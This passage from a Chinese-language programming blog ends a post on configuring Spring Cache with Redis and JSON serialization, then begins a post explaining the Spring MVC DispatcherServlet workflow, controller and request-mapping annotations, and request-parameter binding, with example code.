<p><strong>Step 3: 配置 <code>application.yml</code></strong></p>
<p>告诉Spring Boot我们希望使用Redis作为缓存类型。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment"># ... redis 连接配置 ...</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">redis</span> <span class="comment"># 指定缓存类型为Redis</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">      <span class="attr">time-to-live:</span> <span class="string">600s</span> <span class="comment"># 全局设置缓存的默认过期时间为10分钟</span></span><br><span class="line">      <span class="comment"># key-prefix: myapp:cache: # （可选）为所有缓存键添加一个公共前缀</span></span><br><span class="line">      <span class="comment"># use-key-prefix: true</span></span><br><span class="line">      <span class="comment"># cache-null-values: false # （可选）是否缓存null值，默认为true</span></span><br></pre></td></tr></table></figure>

<p><strong>完成！</strong> Spring Boot的自动配置会检测到 <code>spring.cache.type=redis</code>，然后自动为你配置好一个 <code>RedisCacheManager</code> Bean。现在，你所有的 <code>@Cacheable</code> 等注解就会自动地将数据存入Redis，而不是内存。</p>
<hr>
<h4 id="4-4-4-序列化问题与解决方案"><a href="#4-4-4-序列化问题与解决方案" class="headerlink" title="4.4.4 序列化问题与解决方案"></a>4.4.4 序列化问题与解决方案</h4><p>默认情况下，Spring Cache使用Redis时，会使用 <code>RedisTemplate&lt;Object, Object&gt;</code> 的默认JDK序列化方式。这会导致你在Redis中看到的是<strong>乱码</strong>。</p>
<p>为了解决这个问题，我们需要像之前一样，自定义一个 <code>RedisCacheManager</code> Bean，并为其配置<strong>JSON序列化</strong>。</p>
<p><strong>自定义 <code>RedisCacheManager</code> 配置示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cache.CacheManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.cache.RedisCacheConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.cache.RedisCacheManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.connection.RedisConnectionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.StringRedisSerializer;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CacheManager <span class="title function_">cacheManager</span><span class="params">(RedisConnectionFactory factory)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建一个默认的缓存配置</span></span><br><span class="line">        <span class="type">RedisCacheConfiguration</span> <span class="variable">defaultCacheConfig</span> <span class="operator">=</span> RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">                <span class="comment">// 2. 设置key的序列化方式为String</span></span><br><span class="line">                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>()))</span><br><span class="line">                <span class="comment">// 3. 设置value的序列化方式为JSON</span></span><br><span class="line">                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>()))</span><br><span class="line">                <span class="comment">// 4. 设置默认的过期时间</span></span><br><span class="line">                .entryTtl(Duration.ofMinutes(<span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. （可选）为特定的cacheName设置不同的过期时间</span></span><br><span class="line">        <span class="comment">// Map&lt;String, RedisCacheConfiguration&gt; cacheConfigurations = new HashMap&lt;&gt;();</span></span><br><span class="line">        <span class="comment">// cacheConfigurations.put(&quot;userCache&quot;, defaultCacheConfig.entryTtl(Duration.ofHours(1)));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 创建RedisCacheManager</span></span><br><span class="line">        <span class="keyword">return</span> RedisCacheManager.builder(factory)</span><br><span class="line">                .cacheDefaults(defaultCacheConfig)</span><br><span class="line">                <span class="comment">// .withInitialCacheConfigurations(cacheConfigurations)</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了这个配置后，所有通过Spring Cache存入Redis的数据，其值都会是<strong>可读的JSON格式</strong>，大大提升了可维护性和调试便利性。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/05/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringWeb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冉丝堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="冉的技术宝典">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | 冉的技术宝典">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/05/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E4%B8%8E%E5%B7%A5%E5%85%B7%E5%BA%93/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6-SpringWeb/" class="post-title-link" itemprop="url">Spring全家桶-SpringWeb</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-05 14:27:02" itemprop="dateCreated datePublished" datetime="2025-10-05T14:27:02+08:00">2025-10-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-17 11:09:51" itemprop="dateModified" datetime="2025-10-17T11:09:51+08:00">2025-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/" itemprop="url" rel="index"><span itemprop="name">开发框架与生态</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E4%B8%8E%E7%94%9F%E6%80%81/Spring%E5%85%A8%E5%AE%B6%E6%A1%B6/" itemprop="url" rel="index"><span itemprop="name">Spring全家桶</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="三、SpringWeb"><a href="#三、SpringWeb" class="headerlink" title="三、SpringWeb"></a>三、SpringWeb</h1><h2 id="1-Spring-MVC-同步阻塞模型"><a href="#1-Spring-MVC-同步阻塞模型" class="headerlink" title="1. Spring MVC (同步阻塞模型)"></a>1. Spring MVC (同步阻塞模型)</h2><h3 id="1-1-核心工作流程"><a href="#1-1-核心工作流程" class="headerlink" title="1.1 核心工作流程"></a>1.1 核心工作流程</h3><p>Spring MVC（Model-View-Controller）是一个基于<strong>前端控制器模式 (Front Controller Pattern)</strong> 设计的Web框架。在这个模式中，所有的Web请求都会首先被一个<strong>单一的、核心的Servlet</strong>所拦截，然后由它来负责将请求<strong>分发</strong>给后续的组件进行处理。这个核心的Servlet就是 <strong><code>DispatcherServlet</code></strong>。</p>
<p><code>DispatcherServlet</code> 就像一个机场的**“总调度塔”**，它本身不处理具体的业务逻辑（比如查询用户信息、创建订单），但它负责指挥和协调，确保每一个到来的请求（航班）都能被正确地引导到对应的处理器（登机口），并最终返回正确的响应（乘客到达目的地）。</p>
<h4 id="1-1-1-核心组件"><a href="#1-1-1-核心组件" class="headerlink" title="1.1.1 核心组件"></a>1.1.1 核心组件</h4><p>在深入流程之前，我们先认识一下参与这个流程的几位“关键角色”：</p>
<ol>
<li><strong><code>DispatcherServlet</code> (前端控制器)</strong>:<ul>
<li><strong>职责</strong>: 整个流程的<strong>核心</strong>和<strong>入口</strong>。接收所有HTTP请求，并负责协调各个组件的工作。</li>
</ul>
</li>
<li><strong><code>HandlerMapping</code> (处理器映射器)</strong>:<ul>
<li><strong>职责</strong>: 负责<strong>查找处理器</strong>。<code>DispatcherServlet</code> 会询问它：“对于这个URL的请求，我应该交给哪个处理器（Controller的方法）来处理？”</li>
<li>它会根据请求的URL、HTTP方法等信息，从容器中找到最匹配的 <code>HandlerMethod</code>（包含了Controller实例和对应的方法信息）。</li>
</ul>
</li>
<li><strong><code>HandlerAdapter</code> (处理器适配器)</strong>:<ul>
<li><strong>职责</strong>: 负责<strong>执行处理器</strong>。由于处理器（Handler）的形式多种多样（可能是实现了某个接口的类，也可能是一个被注解标记的方法），<code>DispatcherServlet</code> 自身并不知道如何去调用它们。</li>
<li><code>HandlerAdapter</code> 就像一个**“万能插座转换器”**，它能够适配并以一种标准化的方式去调用任何类型的处理器，并返回一个 <code>ModelAndView</code> 对象。</li>
</ul>
</li>
<li><strong><code>Handler</code> (处理器)</strong>:<ul>
<li><strong>职责</strong>: <strong>处理具体的业务逻辑</strong>。这通常就是我们编写的 <strong><code>Controller</code> 类中的方法</strong>。</li>
<li>它会接收请求参数，调用Service层处理业务，并准备好模型数据（Model）和视图信息（View）。</li>
</ul>
</li>
<li><strong><code>ModelAndView</code> (模型与视图)</strong>:<ul>
<li><strong>职责</strong>: 一个<strong>封装了模型数据和视图信息的容器</strong>。</li>
<li><strong>Model</strong>: 一个Map，包含了需要传递给视图进行渲染的数据（例如，从数据库查出的用户信息）。</li>
<li><strong>View</strong>: 一个逻辑视图名（如 <code>&quot;user/detail&quot;</code>）或一个具体的视图对象。</li>
</ul>
</li>
<li><strong><code>ViewResolver</code> (视图解析器)</strong>:<ul>
<li><strong>职责</strong>: 负责<strong>解析视图</strong>。<code>DispatcherServlet</code> 会拿着 <code>ModelAndView</code> 中的逻辑视图名（如 <code>&quot;user/detail&quot;</code>）去询问 <code>ViewResolver</code>：“这个逻辑名对应的真实视图文件在哪里？”</li>
<li><code>ViewResolver</code> 会根据预先配置好的规则（如添加前缀<code>/WEB-INF/views/</code>和后缀<code>.jsp</code>），将逻辑视图名解析成一个具体的 <code>View</code> 对象（如一个JSP文件或Thymeleaf模板）。</li>
</ul>
</li>
<li><strong><code>View</code> (视图)</strong>:<ul>
<li><strong>职责</strong>: <strong>渲染模型数据</strong>。<code>View</code> 对象接收到模型数据后，负责将数据填充到视图模板中，最终生成HTML等响应内容，返回给客户端。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="1-1-2-工作流程详解-九大步骤"><a href="#1-1-2-工作流程详解-九大步骤" class="headerlink" title="1.1.2 工作流程详解 (九大步骤)"></a>1.1.2 工作流程详解 (九大步骤)</h4><p>下面是当一个HTTP请求（例如 <code>GET /users/123</code>）到达时，Spring MVC内部发生的详细步骤：</p>
<pre><code class="highlight mermaid">sequenceDiagram
    actor Client

    title Spring MVC DispatcherServlet 工作流程
    Client-&gt;&gt;+DS: 1. HTTP Request
    
    DS-&gt;&gt;HM: 2. 查询能处理请求的Handler
    HM--&gt;&gt;DS: 3. 返回HandlerExecutionChain (含Controller方法和Interceptors)

    DS-&gt;&gt;+HA: 4. 请求HandlerAdapter执行Handler
    
    note right of HA: 执行拦截器的 preHandle 方法
    HA-&gt;&gt;I: 5a. Interceptor.preHandle()
    I--&gt;&gt;HA: (若返回false, 则中断流程)

    note right of HA: 参数解析、数据转换、数据校验等
    HA-&gt;&gt;+C: 5b. 通过反射调用Controller方法
    
    C--&gt;&gt;-HA: 6. Controller处理后返回ModelAndView
    
    note right of HA: 执行拦截器的 postHandle 方法
    HA-&gt;&gt;I: 7a. Interceptor.postHandle()
    I--&gt;&gt;HA: 
    
    HA--&gt;&gt;-DS: 7b. 返回ModelAndView给DispatcherServlet

    DS-&gt;&gt;+VR: 8. 请求ViewResolver解析视图
    VR--&gt;&gt;-DS: 返回具体的View对象

    DS-&gt;&gt;+V: 9a. 使用Model数据渲染View
    V--&gt;&gt;-DS: 返回渲染后的响应 (如HTML)

    note left of Client: 视图渲染完毕后
    DS-&gt;&gt;I: 9b. 执行Interceptor.afterCompletion()
    I--&gt;&gt;DS: 
    
    DS--&gt;&gt;-Client: 9c. 响应客户端</code></pre>

<ol>
<li><strong>请求到达 <code>DispatcherServlet</code></strong>:<ul>
<li>用户的HTTP请求被Web服务器（如Tomcat）接收，并根据 <code>web.xml</code> (或Spring Boot的自动配置) 的映射规则，将请求转发给 <code>DispatcherServlet</code>。</li>
</ul>
</li>
<li><strong><code>DispatcherServlet</code> 查询 <code>HandlerMapping</code></strong>:<ul>
<li><code>DispatcherServlet</code> 将请求（<code>HttpServletRequest</code>）交给已注册的 <code>HandlerMapping</code> 实例（通常是 <code>RequestMappingHandlerMapping</code>），询问谁能处理这个请求。</li>
</ul>
</li>
<li><strong><code>HandlerMapping</code> 返回处理器执行链 (<code>HandlerExecutionChain</code>)</strong>:<ul>
<li><code>HandlerMapping</code> 遍历其内部维护的URL与Controller方法的映射关系，找到最匹配的 <code>HandlerMethod</code>。</li>
<li>它不仅返回这个处理器方法，还会返回一个包含所有适用于该请求的<strong>拦截器 (Interceptors)</strong> 的执行链。</li>
</ul>
</li>
<li><strong><code>DispatcherServlet</code> 请求 <code>HandlerAdapter</code> 执行 <code>Handler</code></strong>:<ul>
<li><code>DispatcherServlet</code> 根据找到的 <code>HandlerMethod</code>，选择一个能够处理这种类型Handler的 <code>HandlerAdapter</code>（通常是 <code>RequestMappingHandlerAdapter</code>）。</li>
<li>然后，<code>DispatcherServlet</code> 将请求、响应以及处理器执行链交给这个 <code>HandlerAdapter</code>。</li>
</ul>
</li>
<li><strong><code>HandlerAdapter</code> 调用 <code>Handler</code></strong>:<ul>
<li><code>HandlerAdapter</code> 在调用真正的 <code>Handler</code> (Controller方法) <strong>之前</strong>，会先按顺序执行拦截器的 <code>preHandle</code> 方法。</li>
<li>接着，<code>HandlerAdapter</code> 会进行一系列准备工作，如<strong>参数解析</strong>（将HTTP请求中的参数绑定到Controller方法的参数上）、<strong>数据转换</strong>、<strong>数据校验</strong>等。</li>
<li>一切准备就绪后，它会通过<strong>反射</strong>调用我们编写的Controller方法。</li>
</ul>
</li>
<li><strong><code>Handler</code> (Controller方法) 处理并返回 <code>ModelAndView</code></strong>:<ul>
<li>Controller方法执行业务逻辑，与Service、Repository层交互。</li>
<li>处理完成后，它会将结果数据放入一个 <code>Model</code> 对象，并指定一个逻辑视图名，最终将它们封装成一个 <code>ModelAndView</code> 对象返回给 <code>HandlerAdapter</code>。</li>
<li>(在RESTful场景下，如果方法被 <code>@ResponseBody</code> 注解，会直接返回数据对象，流程会发生变化，跳过视图解析阶段)。</li>
</ul>
</li>
<li><strong><code>HandlerAdapter</code> 返回 <code>ModelAndView</code> 给 <code>DispatcherServlet</code></strong>:<ul>
<li><code>HandlerAdapter</code> 在接收到 <code>ModelAndView</code> 后，会按逆序执行拦截器的 <code>postHandle</code> 方法。</li>
<li>最后，<code>HandlerAdapter</code> 将 <code>ModelAndView</code> 返回给 <code>DispatcherServlet</code>。</li>
</ul>
</li>
<li><strong><code>DispatcherServlet</code> 请求 <code>ViewResolver</code> 解析视图</strong>:<ul>
<li><code>DispatcherServlet</code> 从 <code>ModelAndView</code> 中取出逻辑视图名。</li>
<li>它会遍历所有已注册的 <code>ViewResolver</code>，请求它们将这个逻辑视图名解析为一个具体的 <code>View</code> 对象。</li>
</ul>
</li>
<li><strong><code>View</code> 渲染并响应</strong>:<ul>
<li><code>DispatcherServlet</code> 拿到 <code>View</code> 对象后，将 <code>ModelAndView</code> 中的模型数据传递给它。</li>
<li><code>View</code> 对象（如一个JSP页面）使用模型数据进行渲染，生成最终的HTML响应体。</li>
<li>在视图渲染完成后，<code>DispatcherServlet</code> 会执行拦截器的 <code>afterCompletion</code> 方法（通常用于资源清理）。</li>
<li>最后，<code>DispatcherServlet</code> 将完整的HTTP响应返回给客户端浏览器。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="1-2-常用注解"><a href="#1-2-常用注解" class="headerlink" title="1.2 常用注解"></a>1.2 常用注解</h3><h4 id="1-2-1-类级别注解-Class-level-Annotations"><a href="#1-2-1-类级别注解-Class-level-Annotations" class="headerlink" title="1.2.1 类级别注解 (Class-level Annotations)"></a>1.2.1 类级别注解 (Class-level Annotations)</h4><p>这类注解通常用在Controller类上，用于声明该类的职责。</p>
<ul>
<li><p><strong><code>@Controller</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 这是最基础的Web控制器注解。它继承自 <code>@Component</code>，因此被 <code>@Controller</code> 标记的类会自动被组件扫描发现并注册为Spring Bean。</li>
<li><strong>职责</strong>: 表明这个类是一个<strong>传统的MVC控制器</strong>。它内部的方法通常会返回一个<strong>逻辑视图名</strong>（如<code>&quot;user/list&quot;</code>），然后由 <code>ViewResolver</code> 解析为具体的视图（如JSP或Thymeleaf模板）进行页面渲染。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/profile&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserProfile</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;user&quot;</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userProfile&quot;</span>; <span class="comment">// 返回逻辑视图名，将被解析为 userProfile.html 或 .jsp</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@RestController</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 一个<strong>复合注解</strong>，它由 <code>@Controller</code> 和 <code>@ResponseBody</code> 组合而成。</li>
<li><strong>职责</strong>: 专门用于构建 <strong>RESTful API</strong>。被 <code>@RestController</code> 标记的类，其内部所有被 <code>@RequestMapping</code> 系列注解标记的方法，都会<strong>自动应用 <code>@ResponseBody</code> 的效果</strong>。这意味着方法的返回值将直接被序列化（通常为JSON格式）并写入HTTP响应体中，而不是去解析视图。</li>
<li>这是现代前后端分离架构中的<strong>首选</strong>。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 返回User对象，Spring会通过Jackson自动将其序列化为JSON</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">25</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="1-2-2-请求映射注解-Request-Mapping-Annotations"><a href="#1-2-2-请求映射注解-Request-Mapping-Annotations" class="headerlink" title="1.2.2 请求映射注解 (Request Mapping Annotations)"></a>1.2.2 请求映射注解 (Request Mapping Annotations)</h4><p>这类注解用于将HTTP请求映射到具体的Controller处理方法上。</p>
<ul>
<li><p><strong><code>@RequestMapping</code></strong>:</p>
<ul>
<li><strong>作用</strong>: 最通用、最基础的映射注解。它可以用于<strong>类级别</strong>和<strong>方法级别</strong>。<ul>
<li><strong>类级别</strong>: 为该控制器下的所有方法提供一个<strong>公共的URL前缀</strong>。</li>
<li><strong>方法级别</strong>: 定义处理具体请求的路径。</li>
</ul>
</li>
<li><strong>属性</strong>:<ul>
<li><code>value</code> 或 <code>path</code>: 指定请求的URL路径（支持Ant风格的通配符，如 <code>*</code>, <code>**</code>, <code>?</code>）。</li>
<li><code>method</code>: 指定HTTP请求方法，如 <code>RequestMethod.GET</code>, <code>RequestMethod.POST</code>。</li>
<li><code>params</code>: 要求请求中必须包含指定的参数，如 <code>params=&quot;myParam=myValue&quot;</code>。</li>
<li><code>headers</code>: 要求请求头必须包含指定的信息。</li>
<li><code>consumes</code>: 指定请求体的内容类型（Content-Type），如 <code>consumes=&quot;application/json&quot;</code>。</li>
<li><code>produces</code>: 指定响应体的内容类型，如 <code>produces=&quot;application/json&quot;</code>。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/v1/products&quot;)</span> <span class="comment">// 类级别映射</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;&quot;, method = RequestMethod.GET)</span> <span class="comment">// 方法级别映射</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Product&gt; <span class="title function_">getAllProducts</span><span class="params">()</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/&#123;id&#125;&quot;, method = RequestMethod.POST, consumes = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">updateProduct</span><span class="params">(<span class="meta">@PathVariable</span> Long id, <span class="meta">@RequestBody</span> Product product)</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>@RequestMapping</code> 的快捷注解 (Shortcut Annotations)</strong>:<br>为了简化开发，Spring提供了针对不同HTTP方法的专用快捷注解。它们在功能上与 <code>@RequestMapping(method = ...)</code> 等价，但代码更简洁、语义更清晰。</p>
<ul>
<li><strong><code>@GetMapping</code></strong>: 映射HTTP GET请求。</li>
<li><strong><code>@PostMapping</code></strong>: 映射HTTP POST请求。</li>
<li><strong><code>@PutMapping</code></strong>: 映射HTTP PUT请求。</li>
<li><strong><code>@DeleteMapping</code></strong>: 映射HTTP DELETE请求。</li>
<li><strong><code>@PatchMapping</code></strong>: 映射HTTP PATCH请求。</li>
</ul>
<p><strong>使用快捷注解重构上面的例子</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/v1/products&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping</span> <span class="comment">// 更简洁</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Product&gt; <span class="title function_">getAllProducts</span><span class="params">()</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/&#123;id&#125;&quot;)</span> <span class="comment">// consumes属性依然可以添加</span></span><br><span class="line">    <span class="keyword">public</span> Product <span class="title function_">updateProduct</span><span class="params">(<span class="meta">@PathVariable</span> Long id, <span class="meta">@RequestBody</span> Product product)</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="1-2-3-RequestMapping-与-RestController-的关系总结"><a href="#1-2-3-RequestMapping-与-RestController-的关系总结" class="headerlink" title="1.2.3 @RequestMapping 与 @RestController 的关系总结"></a>1.2.3 <code>@RequestMapping</code> 与 <code>@RestController</code> 的关系总结</h4><table>
<thead>
<tr>
<th align="left">类注解</th>
<th align="left">方法注解</th>
<th align="left">返回值处理方式</th>
<th align="left">适用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>@Controller</code></td>
<td align="left"><code>@RequestMapping</code></td>
<td align="left"><strong>默认解析为视图</strong>。如果方法想返回数据，需要<strong>额外</strong>加<code>@ResponseBody</code>。</td>
<td align="left">传统的MVC，服务端渲染</td>
</tr>
<tr>
<td align="left"><code>@RestController</code></td>
<td align="left"><code>@GetMapping</code>等</td>
<td align="left"><strong>默认直接返回数据 (JSON&#x2F;XML)</strong>。所有方法隐式地应用了<code>@ResponseBody</code>。</td>
<td align="left"><strong>RESTful API</strong>，前后端分离</td>
</tr>
</tbody></table>
<p>在现代Web开发中，<code>@RestController</code> 及其配套的 <code>@GetMapping</code>, <code>@PostMapping</code> 等快捷注解，是构建后端API服务时最常用的组合。</p>
<hr>
<h3 id="1-3-请求参数处理"><a href="#1-3-请求参数处理" class="headerlink" title="1.3 请求参数处理"></a>1.3 请求参数处理</h3><h4 id="1-3-1-参数绑定"><a href="#1-3-1-参数绑定" class="headerlink" title="1.3.1 参数绑定"></a>1.3.1 参数绑定</h4><p>参数绑定（或称请求参数处理）是Spring MVC框架的一项强大功能。它的核心任务是将<strong>HTTP请求中的数据（如URL路径变量、查询参数、请求体等）自动地提取出来，进行必要的类型转换，并赋值给Controller处理方法的参数</strong>。这使得开发者可以像调用普通Java方法一样来编写Controller，而无需手动去解析底层的 <code>HttpServletRequest</code> 对象。</p>
<p>以下是用于参数绑定的最常用注解：</p>
<hr>
<h5 id="1-RequestParam-提取请求参数"><a href="#1-RequestParam-提取请求参数" class="headerlink" title="1. @RequestParam - 提取请求参数"></a>1. <code>@RequestParam</code> - 提取请求参数</h5><ul>
<li><p><strong>作用</strong>: 用于从<strong>查询字符串 (Query String)</strong> 或 <strong>POST表单数据 (<code>x-www-form-urlencoded</code>)</strong> 中提取参数。</p>
</li>
<li><p><strong>常见场景</strong>: <code>GET /users?name=alice&amp;age=30</code> 或 <code>POST /login</code> (表单提交)。</p>
</li>
<li><p><strong>核心属性</strong>:</p>
<ul>
<li><code>value</code> 或 <code>name</code>: 指定要绑定的请求参数的名称。如果方法参数名与请求参数名一致，此属性可以省略。</li>
<li><code>required</code>: 布尔值，表示该参数是否<strong>必需</strong>。默认为 <code>true</code>，如果请求中不包含该参数，会抛出异常。设为 <code>false</code> 则为可选参数。</li>
<li><code>defaultValue</code>: 字符串，提供一个<strong>默认值</strong>。当参数为可选 (<code>required=false</code>) 且请求中未提供该参数时，会使用此默认值。<strong>注意：<code>defaultValue</code> 隐含了 <code>required=false</code> 的效果</strong>。</li>
</ul>
</li>
<li><p><strong>示例</strong>:</p>
